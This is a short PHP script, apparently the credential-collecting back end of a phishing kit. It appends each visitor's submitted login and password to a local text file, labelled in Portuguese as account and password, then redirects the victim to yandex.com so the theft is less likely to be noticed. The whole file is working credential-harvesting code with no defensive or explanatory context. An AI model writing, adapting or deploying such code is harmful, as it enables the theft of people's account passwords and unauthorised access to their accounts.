<?php

file_put_contents("usernames.txt", "Conta: " . $_POST['login'] . " Senha: " . $_POST['passwd'] . "\n", FILE_APPEND);
header('Location: https://yandex.com');
exit();
